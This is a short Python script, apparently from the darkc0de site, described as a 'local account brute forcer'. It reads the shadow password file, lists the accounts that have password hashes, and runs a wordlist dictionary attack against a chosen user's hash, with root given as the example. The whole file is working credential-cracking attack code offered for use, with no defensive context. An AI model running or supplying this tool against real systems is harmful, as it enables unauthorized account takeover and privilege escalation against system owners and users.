#!/usr/bin/python
#Local account brute forcer.
#(You need to be able to read shadow file)

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import sys, crypt, spwd
if len(sys.argv) != 3:
	print "\nUsage: ./locbrute.py <user> <wordlist>"
	print "Ex: ./locbrute.py root words.txt\n"
	sys.exit(1)

print "\nAccounts with encrypted passwords:\n"
users = spwd.getspall()
for user in users:
	if user[1] not in ["*","!"]: 
		print user[:2]
try:
	words = open(sys.argv[2], "r").readlines()
except(IOError):
	print "\n[-] Error: Couldn't open wordlist\n"
	sys.exit(1)
print "\n[+] Words Loaded:",len(words)
try:
	passwd = spwd.getspnam(sys.argv[1])[1]
except(KeyError):
	print "\n[-] User not found. Check list above\n"
	sys.exit(1)
print "[+] Cracking:",passwd
for word in words:
	word = word.replace("\n","")
	if crypt.crypt(word, passwd) == passwd:
		print "\n[!] Cracked: [ ",word," ]\n"
		sys.exit(1)
print "\n[-] Couldn't find match\n"
	




	
	



